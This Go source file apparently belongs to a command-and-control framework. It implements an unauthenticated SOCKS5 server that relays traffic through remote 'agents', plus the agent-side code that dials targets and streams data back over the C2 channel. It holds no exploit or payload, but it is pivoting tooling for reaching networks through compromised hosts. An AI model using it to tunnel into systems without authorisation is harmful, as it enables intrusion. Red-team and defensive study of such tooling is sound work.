package socks

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"sync"
	"time"
)

// Server is a SOCKS5 proxy server that tunnels through C2 agents.
type Server struct {
	addr     string
	listener net.Listener
	mu       sync.RWMutex

	// Callback to create connections through an agent
	agentDial func(target string) (net.Conn, error)

	running bool
	quit    chan struct{}
	stats   ServerStats
}

// ServerStats holds proxy statistics.
type ServerStats struct {
	ActiveConnections int
	TotalBytesUp      uint64
	TotalBytesDown    uint64
	TotalConnections  uint64
	mu                sync.RWMutex
}

// StatsSnapshot is a copyable snapshot of server stats (without mutex).
type StatsSnapshot struct {
	ActiveConnections int
	TotalBytesUp      uint64
	TotalBytesDown    uint64
	TotalConnections  uint64
}

// New creates a new SOCKS5 server bound to the given address.
// agentDial is called to create connections through the agent to targets.
func New(addr string, agentDial func(target string) (net.Conn, error)) *Server {
	return &Server{
		addr:      addr,
		agentDial: agentDial,
		quit:      make(chan struct{}),
	}
}

// Start begins accepting SOCKS5 connections.
func (s *Server) Start() error {
	var err error
	s.listener, err = net.Listen("tcp", s.addr)
	if err != nil {
		return fmt.Errorf("socks listen: %w", err)
	}

	s.running = true
	log.Printf("[SOCKS5] Listening on %s", s.addr)

	go s.acceptLoop()
	return nil
}

// Stop shuts down the SOCKS5 server.
func (s *Server) Stop() {
	s.running = false
	close(s.quit)
	if s.listener != nil {
		s.listener.Close()
	}
}

// Stats returns current proxy statistics.
func (s *Server) Stats() StatsSnapshot {
	s.stats.mu.RLock()
	defer s.stats.mu.RUnlock()
	return StatsSnapshot{
		ActiveConnections: s.stats.ActiveConnections,
		TotalBytesUp:      s.stats.TotalBytesUp,
		TotalBytesDown:    s.stats.TotalBytesDown,
		TotalConnections:  s.stats.TotalConnections,
	}
}

// Addr returns the listening address.
func (s *Server) Addr() string {
	return s.addr
}

func (s *Server) acceptLoop() {
	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				continue
			}
			return
		}

		s.stats.mu.Lock()
		s.stats.TotalConnections++
		s.stats.mu.Unlock()

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(client net.Conn) {
	defer client.Close()

	s.stats.mu.Lock()
	s.stats.ActiveConnections++
	s.stats.mu.Unlock()

	defer func() {
		s.stats.mu.Lock()
		s.stats.ActiveConnections--
		s.stats.mu.Unlock()
	}()

	// SOCKS5 handshake
	target, err := s.handleHandshake(client)
	if err != nil {
		log.Printf("[SOCKS5] Handshake error: %v", err)
		return
	}

	// Connect to target through agent
	targetConn, err := s.agentDial(target)
	if err != nil {
		log.Printf("[SOCKS5] Agent dial error for %s: %v", target, err)
		s.sendReply(client, 0x04) // Host unreachable
		return
	}
	defer targetConn.Close()

	// Send success reply
	s.sendReply(client, 0x00) // Success

	// Relay data bidirectionally
	s.relay(client, targetConn, target)
}

func (s *Server) handleHandshake(client net.Conn) (string, error) {
	buf := make([]byte, 263)

	// Read auth methods
	if _, err := io.ReadFull(client, buf[:2]); err != nil {
		return "", fmt.Errorf("read version: %w", err)
	}

	if buf[0] != 0x05 {
		return "", fmt.Errorf("unsupported SOCKS version: %d", buf[0])
	}

	nmethods := int(buf[1])
	if _, err := io.ReadFull(client, buf[:nmethods]); err != nil {
		return "", fmt.Errorf("read methods: %w", err)
	}

	// Reply: no authentication required
	client.Write([]byte{0x05, 0x00})

	// Read request
	if _, err := io.ReadFull(client, buf[:4]); err != nil {
		return "", fmt.Errorf("read request: %w", err)
	}

	if buf[0] != 0x05 {
		return "", fmt.Errorf("bad version in request")
	}

	cmd := buf[1]
	if cmd != 0x01 {
		return "", fmt.Errorf("unsupported command: %d (only CONNECT supported)", cmd)
	}

	// Parse address
	atyp := buf[3]
	var host string

	switch atyp {
	case 0x01: // IPv4
		if _, err := io.ReadFull(client, buf[:4]); err != nil {
			return "", fmt.Errorf("read IPv4: %w", err)
		}
		host = net.IP(buf[:4]).String()

	case 0x03: // Domain name
		if _, err := io.ReadFull(client, buf[:1]); err != nil {
			return "", fmt.Errorf("read domain len: %w", err)
		}
		domainLen := int(buf[0])
		if _, err := io.ReadFull(client, buf[:domainLen]); err != nil {
			return "", fmt.Errorf("read domain: %w", err)
		}
		host = string(buf[:domainLen])

	case 0x04: // IPv6
		if _, err := io.ReadFull(client, buf[:16]); err != nil {
			return "", fmt.Errorf("read IPv6: %w", err)
		}
		host = net.IP(buf[:16]).String()

	default:
		return "", fmt.Errorf("unsupported address type: %d", atyp)
	}

	// Read port
	if _, err := io.ReadFull(client, buf[:2]); err != nil {
		return "", fmt.Errorf("read port: %w", err)
	}
	port := binary.BigEndian.Uint16(buf[:2])

	return net.JoinHostPort(host, strconv.Itoa(int(port))), nil
}

func (s *Server) sendReply(client net.Conn, rep byte) {
	reply := []byte{
		0x05, rep, 0x00, 0x01, // version, reply, reserved, IPv4
		0x00, 0x00, 0x00, 0x00, // bind address (0.0.0.0)
		0x00, 0x00, // bind port (0)
	}
	client.Write(reply)
}

func (s *Server) relay(client, target net.Conn, targetAddr string) {
	var wg sync.WaitGroup
	wg.Add(2)

	// Client → Target
	go func() {
		defer wg.Done()
		defer target.Close()
		n, _ := io.Copy(target, client)
		s.stats.mu.Lock()
		s.stats.TotalBytesUp += uint64(n)
		s.stats.mu.Unlock()
	}()

	// Target → Client
	go func() {
		defer wg.Done()
		defer client.Close()
		n, _ := io.Copy(client, target)
		s.stats.mu.Lock()
		s.stats.TotalBytesDown += uint64(n)
		s.stats.mu.Unlock()
	}()

	wg.Wait()
}

// --- SOCKS5 Agent Side ---

// AgentProxy handles the agent-side of SOCKS5 tunneling.
// It receives target addresses from the C2 and connects to them locally.
type AgentProxy struct {
	activeConns map[string]net.Conn
	mu          sync.Mutex
}

// NewAgentProxy creates a new agent-side proxy handler.
func NewAgentProxy() *AgentProxy {
	return &AgentProxy{
		activeConns: make(map[string]net.Conn),
	}
}

// ConnectTo establishes a TCP connection to the given target.
func (p *AgentProxy) ConnectTo(target string) error {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return fmt.Errorf("dial %s: %w", target, err)
	}

	p.mu.Lock()
	p.activeConns[target] = conn
	p.mu.Unlock()

	return nil
}

// RelayStream relays data between the C2 channel and a target connection.
func (p *AgentProxy) RelayStream(connID string, readFromC2 <-chan []byte, writeToC2 chan<- []byte) {
	conn, ok := p.activeConns[connID]
	if !ok {
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	// C2 → Target
	go func() {
		defer wg.Done()
		for data := range readFromC2 {
			if conn != nil {
				conn.Write(data)
			}
		}
	}()

	// Target → C2
	go func() {
		defer wg.Done()
		defer p.CloseAll()
		buf := make([]byte, 32768)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				return
			}
			select {
			case writeToC2 <- buf[:n]:
			default:
				return
			}
		}
	}()

	wg.Wait()
}

// CloseAll closes all active proxy connections.
func (p *AgentProxy) CloseAll() {
	p.mu.Lock()
	defer p.mu.Unlock()
	for id, conn := range p.activeConns {
		conn.Close()
		delete(p.activeConns, id)
	}
}
